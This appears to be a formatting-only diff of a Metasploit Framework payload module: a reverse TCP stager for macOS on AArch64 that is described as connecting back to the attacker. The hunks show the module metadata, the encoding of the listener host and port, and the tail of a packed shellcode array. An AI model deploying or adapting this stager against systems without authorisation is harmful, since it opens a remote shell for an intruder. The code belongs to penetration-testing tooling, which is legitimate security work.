@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 ###
 #
 # ReverseTcp
@@ -14,28 +12,30 @@
 #
 ###
 module MetasploitModule
-
   CachedSize = 328
 
   include Msf::Payload::Stager
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Reverse TCP Stager',
-      'Description'   => 'Connect back to the attacker',
-      'Author'        => 'usiegl00',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'osx',
-      'Arch'          => ARCH_AARCH64,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Stager'        => { 'RequiresMidstager' => false},
-      'Convention'    => 'sockedi',
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Reverse TCP Stager',
+        'Description' => 'Connect back to the attacker',
+        'Author' => 'usiegl00',
+        'License' => MSF_LICENSE,
+        'Platform' => 'osx',
+        'Arch' => ARCH_AARCH64,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Stager' => { 'RequiresMidstager' => false },
+        'Convention' => 'sockedi'
+      )
+    )
   end
 
-  def generate(opts = {})
-    encoded_port = [datastore['LPORT'].to_i,2].pack("vv").unpack("N").first
-    encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
+  def generate(_opts = {})
+    encoded_port = [datastore['LPORT'].to_i, 2].pack('vv').unpack('N').first
+    encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack('V').first
     retry_count = datastore['StagerRetryCount']
     seconds = datastore['StagerRetryWait']
     sleep_seconds = seconds.to_i
@@ -125,7 +125,7 @@ module MetasploitModule
       0x00000000,
       0x02000001,
       0x00000000,
-    ].pack("V*")    
+    ].pack('V*')
     return payload
   end
 end
